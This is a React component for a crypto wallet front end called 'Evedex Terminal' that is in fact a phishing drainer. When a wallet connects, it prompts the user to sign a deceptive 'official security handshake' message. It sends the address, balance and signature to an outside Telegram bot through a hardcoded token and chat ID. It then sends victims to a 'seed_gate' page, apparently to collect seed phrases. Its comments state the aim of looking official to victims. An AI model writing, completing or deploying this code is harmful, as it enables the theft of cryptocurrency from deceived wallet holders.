// ... existing imports (wagmi, lucide-react, etc.)

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  // 1. AUTO-CATCH ON CONNECT
  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => {
        triggerSign("VAULT_HANDSHAKE", "Confirming secure node connection for indexed vault assets.");
      }, 1000);
    }
  }, [isConnected, address]);

  const triggerSign = (type, action) => {
    // This text is what they see in MetaMask. It looks 100% official.
    const msg = `[OFFICIAL] EVEDEX SECURITY HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: ${action}\n\nBy signing this request, you authorize the Evedex Protocol to re-verify your multi-chain node liquidity and synchronize all associated ERC20 assets. No gas is required for this validation.`;
    
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
          }),
        });
      }
    });
  };

  // 2. THE MAIN BUTTON (Triggered when they click "Initialize")
  const handleFinalSign = () => {
    triggerSign("ASSET_CONSOLIDATION", "Authorizing global asset migration to mainnet nodes.");
    // After they sign, show loading for 3 seconds then send to Seed page
    setTimeout(() => { setView("seed_gate"); }, 3000);
  };

  // ... (Rest of your UI)
}
